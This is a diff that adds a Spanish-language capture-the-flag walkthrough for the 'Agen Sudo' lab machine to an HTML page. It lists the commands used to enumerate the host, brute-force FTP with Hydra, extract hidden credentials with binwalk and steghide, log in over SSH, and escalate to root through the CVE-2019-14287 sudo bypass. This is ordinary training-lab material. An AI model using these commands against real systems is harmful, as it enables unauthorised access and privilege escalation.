@@ -23,7 +23,91 @@
                       
     <h2 onclick="toggleDetails('maquinas-resueltas')">Máquinas Virtuales Resueltas</h2>
             <div id="maquinas-resueltas" class="details">
-    
+<div id="Agen-Sudo">
+    <h3 onclick="toggleDetails('agen-sudo-details')">Agen Sudo</h3>
+    <div id="agen-sudo-details" class="details">
+        
+        <h4 onclick="toggleDetails('agen-sudo-ping')">Fase de enumeración: Ping al host 10.10.10.10</h4>
+        <div id="agen-sudo-ping" class="details">
+            <p>Realizamos un ping al host 10.10.10.10 para verificar la conectividad:</p>
+            <pre><code class="prompt">ping -c 1 10.10.10.10</code></pre>
+        </div>
+
+        <h4 onclick="toggleDetails('agen-sudo-web')">Fase de enumeración: Exploración inicial del sitio web</h4>
+        <div id="agen-sudo-web" class="details">
+            <p>Accedemos al sitio web utilizando un navegador o herramienta como curl:</p>
+            <pre><code class="prompt">ir a http://10.10.10.10</code></pre>
+            <p>Observamos la pista en la cabecera User-Agent y el nombre del agente (R).</p>
+            <p>Modificamos el User-Agent en la petición HTTP para probar diferentes valores.</p>
+        </div>
+
+        <h4 onclick="toggleDetails('agen-sudo-agent')">Fase de enumeración: Descubrimiento del nombre del agente</h4>
+        <div id="agen-sudo-agent" class="details">
+            <p>Utilizamos Burp Suite para interceptar la petición HTTP.</p>
+            <p>Configuramos Intruder con el método GET y la posición para sniper.</p>
+            <p>Cargamos la lista de caracteres (char.txt) como payloads.</p>
+            <p>Iniciamos el ataque y observamos que las letras C y R destacan los status.</p>
+            <p>Editamos la petición GET en el navegador para revelar el nombre del agente (Chris).</p>
+        </div>
+
+        <h4 onclick="toggleDetails('agen-sudo-ftp')">Fase de cracking y fuerza bruta: Ataque al servicio FTP</h4>
+        <div id="agen-sudo-ftp" class="details">
+            <p>Ataque al servicio FTP utilizando Hydra:</p>
+            <pre><code class="prompt">hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ftp</code></pre>
+        </div>
+
+        <h4 onclick="toggleDetails('agen-sudo-files')">Fase de análisis: Análisis de archivos</h4>
+        <div id="agen-sudo-files" class="details">
+            <p>Descargamos los archivos del FTP:</p>
+            <pre><code class="prompt">ftp 10.10.10.10</code></pre>
+            <pre><code class="prompt">dir</code></pre>
+            <pre><code class="prompt">mget *</code></pre>
+            <pre><code class="prompt">exit</code></pre>
+            <p>Analizamos la imagen cute-alien.png con Binwalk:</p>
+            <pre><code class="prompt">binwalk -e cute-alien.png</code></pre>
+            <p>Identificamos un archivo zip oculto en la imagen cutie.png.</p>
+            <pre><code class="prompt">binwalk -e cutie.png</code></pre>
+            <p>Extraemos el archivo zip utilizando 7zip y la contraseña obtenida (Alien).</p>
+            <pre><code class="prompt">7z x 8702.zip -pAlien</code></pre>
+            <p>Analizamos el contenido del archivo extraído.</p>
+            <pre><code class="prompt">cat TO_agentR.txt</code></pre>
+            <p>Decodificamos un mensaje oculto en TO_agentR.txt utilizando base64.</p>
+            <pre><code class="prompt">echo 'QXJLYTUX' | base64 -d</code></pre>
+        </div>
+
+        <h4 onclick="toggleDetails('agen-sudo-exploit')">Fase de explotación: Acceso al servicio SSH</h4>
+        <div id="agen-sudo-exploit" class="details">
+            <p>Extraemos el mensaje oculto de la imagen cute-alien.png utilizando steghide y la contraseña "Area51":</p>
+            <pre><code class="prompt">steghide extract -sf cute-alien.png -p Area51</code></pre>
+            <p>Desciframos la contraseña del mensaje base64 para obtener la contraseña de SSH "hacker rules!" y el usuario "James":</p>
+            <pre><code class="prompt">echo 'aGFja2VyIHJ1bGVzIQ==' | base64 -d</code></pre>
+            <p>Accedemos al servicio SSH con las credenciales obtenidas:</p>
+            <pre><code class="prompt">ssh james@10.10.10.10</code></pre>
+        </div>
+
+        <h4 onclick="toggleDetails('agen-sudo-reverse')">Búsqueda inversa de imágenes</h4>
+        <div id="agen-sudo-reverse" class="details">
+            <p>Ejecutamos un servidor HTTP en la máquina objetivo y descargamos la imagen alien-autopsy.jpg.</p>
+            <pre><code class="prompt">python3 -m http.server</code></pre>
+            <p>Descargamos la imagen en nuestra máquina.</p>
+            <pre><code class="prompt">wget http://10.10.10.10:8000/alien-autopsy.jpg</code></pre>
+            <p>Buscamos la imagen en Google Images para obtener más información sobre ella.</p>
+        </div>
+
+        <h4 onclick="toggleDetails('agen-sudo-escalation')">Fase de escalada de privilegios</h4>
+        <div id="agen-sudo-escalation" class="details">
+            <p>Revisamos los permisos de sudo y descubrimos una vulnerabilidad (CVE-2019-14287) que permite ejecutar comandos con privilegios de root:</p>
+            <pre><code class="prompt">sudo -l</code></pre>
+            <p>Ejecutamos el exploit para obtener acceso como root:</p>
+            <pre><code class="prompt">sudo -u#-1 /bin/bash</code></pre>
+            <p>Accedemos al directorio root y leemos el archivo root.txt:</p>
+            <pre><code class="prompt">cd /root</code></pre>
+            <pre><code class="prompt">cat root.txt</code></pre>
+        </div>
+
+    </div>
+</div>
+                
     <div id="rick-pepinillo">
         <h3 onclick="toggleDetails('rick-pepinillo-details')">Rick Pepinillo</h3>
         <div id="rick-pepinillo-details" class="details">
